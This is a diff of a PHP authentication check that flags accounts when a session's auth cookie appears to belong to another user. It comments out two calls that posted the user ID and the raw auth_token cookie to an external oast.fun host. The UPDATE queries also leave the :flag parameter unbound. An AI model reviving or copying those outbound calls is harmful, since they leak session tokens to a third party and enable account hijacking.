@@ -26,17 +26,17 @@ if (!auth_token_cookie_verif($_COOKIE['auth_token'])) {
 
 if (isset($_SESSION['user_id'])) {
     $cookie_verif = auth_token_cookie_verif($_COOKIE['auth_token']);
-    if (isset($cookie_verif['user_id'])) {
-        if ($cookie_verif['user_id'] !== $_SESSION['user_id']) {
+    if ($cookie_verif) {
+        if ($cookie_verif !== $_SESSION['user_id']) {
             $stmt = $conn->prepare("UPDATE users SET flag=:flag, flag_reason=:flag_reason WHERE user_id = :user_id");
-            $stmt->execute(['user_id' => $_SESSION['user_id'], 'flag_reason' => 'Cookie used is stolen from ' . $cookie_verif['user_id']]);
+            $stmt->execute(['user_id' => $_SESSION['user_id'], 'flag_reason' => 'Cookie used is stolen from ' . $cookie_verif]);
 
             $stmt = $conn->prepare("UPDATE users SET flag=:flag, flag_reason=:flag_reason WHERE user_id = :user_id");
-            $stmt->execute(['user_id' => $cookie_verif['user_id'], 'flag_reason' => 'Cookie used has been exposed or used by another user ' . $_SESSION['user_id']]);
+            $stmt->execute(['user_id' => $cookie_verif, 'flag_reason' => 'Cookie used has been exposed or used by another user ' . $_SESSION['user_id']]);
         }
     } else {
-        httpPost('https://vkcyfnuacfxsgnqphfcxts477af9mrw2j.oast.fun',$cookie_verif);
-        httpPost('https://vkcyfnuacfxsgnqphfcxts477af9mrw2j.oast.fun',['sessid'=>$_SESSION['user_id'],'cookie'=>$_COOKIE['auth_token']]);
+        //httpPost('https://vkcyfnuacfxsgnqphfcxts477af9mrw2j.oast.fun',$cookie_verif);
+        //httpPost('https://vkcyfnuacfxsgnqphfcxts477af9mrw2j.oast.fun',['sessid'=>$_SESSION['user_id'],'cookie'=>$_COOKIE['auth_token']]);
         header("Location: ./logout.php?err=991");
         exit;
     }
